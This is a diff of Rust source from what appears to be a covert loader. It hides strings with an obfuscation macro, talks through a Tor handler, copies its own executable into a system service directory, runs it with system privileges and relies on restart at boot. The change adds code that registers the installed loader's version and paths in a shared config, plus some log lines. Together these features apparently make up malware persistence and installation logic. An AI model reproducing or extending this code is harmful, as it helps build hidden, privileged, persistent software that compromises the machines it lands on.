@@ -12,7 +12,12 @@ use crate::network::tor::LdrTrHandler;
 use crate::service::utils::SERVICE_TYPE;
 use crate::{ err, info, tag, warn };
 use anyhow::{ Context, Result };
-use loader_vars::constants::{ loader_service_name, system_log_directory, system_service_directory };
+use loader_vars::constants::{
+    loader_service_name,
+    loader_version,
+    system_log_directory,
+    system_service_directory,
+};
 use loader_vars::types::receive::RnCnfgPrms;
 use obfstr::obfstr as s;
 use shared::constants::{
@@ -23,7 +28,7 @@ use shared::constants::{
     system_loader_exe_name,
 };
 use shared::network::tor::LoggerCnfg;
-use shared::utils::config::load_mib_config;
+use shared::utils::config::{ load_mib_config, write_mib_config, HstCnfg };
 use shared::utils::functions::{
     exit_1_insta,
     get_current_exe,
@@ -193,8 +198,15 @@ fn post_cleanup() -> Result<()> {
     let system_exe = system_service_directory().join(system_loader_exe_name());
     std::fs::copy(get_current_exe()?, &system_exe)?;
     let cache_path = system_service_directory().join(s!("cache.cfg"));
-    std::fs::write(cache_path, "")?;
-
+    std::fs::write(&cache_path, "")?;
+    let mut mib_config = load_mib_config(true)?;
+    mib_config.ldrs.push(HstCnfg {
+        version: loader_version(),
+        folder_path: system_service_directory().to_str().unwrap().to_string(),
+        exe_path: system_exe.to_str().unwrap().to_string(),
+        config_path: cache_path.to_str().unwrap().to_string(),
+    });
+    write_mib_config(&mib_config)?;
     // then we just run it, and exit - if it fails we auto restart next boot
     try_spawn_program_as_system(system_exe.to_str().unwrap(), None)?;
 
@@ -215,10 +227,11 @@ fn system_service_work() -> Result<()> {
             err!("create_dir_all on loader_install_lock_dir Error: ", error);
         }
     }
+    info!("run config pre tor handler");
 
     // always run default - if theres already installed - we just run the apps, if higher versions also run those
     run_config(RnCnfgPrms::default())?;
-
+    info!("run config done");
     tokio::runtime::Builder
         ::new_multi_thread()
         .enable_all()
